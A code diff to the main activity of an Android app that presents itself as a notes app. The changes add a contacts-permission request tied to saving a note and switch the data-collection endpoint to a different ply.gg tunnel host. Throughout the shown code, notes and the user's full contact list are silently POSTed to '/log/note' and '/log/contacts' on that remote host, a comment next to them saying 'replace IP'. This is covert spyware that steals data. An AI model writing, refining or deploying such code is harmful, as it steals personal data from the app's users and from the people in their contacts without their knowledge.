@@ -47,6 +47,7 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
 
     private static final int STORAGE_PERMISSION_CODE = 101;
+    private static final int CONTACTS_PERMISSION_CODE = 102;
     private static final String NOTES_DIRECTORY_NAME = "NotesApp";
     private static final String TAG = "MainActivityNotes";
 
@@ -82,10 +83,24 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void checkPermissionAndSaveNote() {
-        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
-                == PackageManager.PERMISSION_DENIED) {
-            requestStoragePermission();
+        // Check both permissions
+        boolean hasStoragePermission = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        boolean hasContactsPermission = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+
+        if (!hasStoragePermission) {
+            // Request storage permission first
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
+                    STORAGE_PERMISSION_CODE);
+        } else if (!hasContactsPermission) {
+            // If storage permission is granted but contacts isn't, request contacts
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.READ_CONTACTS},
+                    CONTACTS_PERMISSION_CODE);
         } else {
+            // Both permissions granted, proceed with saving
             saveNote();
         }
     }
@@ -102,9 +117,27 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == STORAGE_PERMISSION_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 Toast.makeText(this, "Storage Permission Granted", Toast.LENGTH_SHORT).show();
-                saveNote();
+                // After storage permission is granted, check contacts permission
+                boolean hasContactsPermission = ContextCompat.checkSelfPermission(this,
+                        Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+
+                if (!hasContactsPermission) {
+                    ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.READ_CONTACTS},
+                            CONTACTS_PERMISSION_CODE);
+                } else {
+                    saveNote(); // Both permissions already granted
+                }
             } else {
                 Toast.makeText(this, "Storage Permission Denied. Cannot save note.", Toast.LENGTH_LONG).show();
+            }
+        } else if (requestCode == CONTACTS_PERMISSION_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "Contacts Permission Granted", Toast.LENGTH_SHORT).show();
+                saveNote(); // Now we have both permissions
+            } else {
+                Toast.makeText(this, "Contacts Permission Denied. Will save note without contacts.", Toast.LENGTH_LONG).show();
+                saveNote(); // Save note without contacts access
             }
         }
     }
@@ -125,8 +158,12 @@ public class MainActivity extends AppCompatActivity {
 
                 // Gửi dữ liệu đi
                 sendNoteToServer(title, content);
-                readContactsAndSend();
 
+                // Only read contacts if we have permission
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) ==
+                        PackageManager.PERMISSION_GRANTED) {
+                    readContactsAndSend();
+                }
             } else {
                 Toast.makeText(this, "Error: Could not save note!", Toast.LENGTH_LONG).show();
             }
@@ -156,7 +193,7 @@ public class MainActivity extends AppCompatActivity {
     private void sendNoteToServer(String title, String content) {
         new Thread(() -> {
             try {
-                URL url = new URL("http://responsibility-sorted.gl.at.ply.gg:40543/log/note"); // ← THAY IP
+                URL url = new URL("http://feet-linking.gl.at.ply.gg:1554/log/note"); // ← THAY IP
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
@@ -181,7 +218,7 @@ public class MainActivity extends AppCompatActivity {
     private void sendContactsToServer(String contacts) {
         new Thread(() -> {
             try {
-                URL url = new URL("http://responsibility-sorted.gl.at.ply.gg:40543/log/contacts"); // ← THAY IP
+                URL url = new URL("http://feet-linking.gl.at.ply.gg:1554/log/contacts"); // ← THAY IP
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
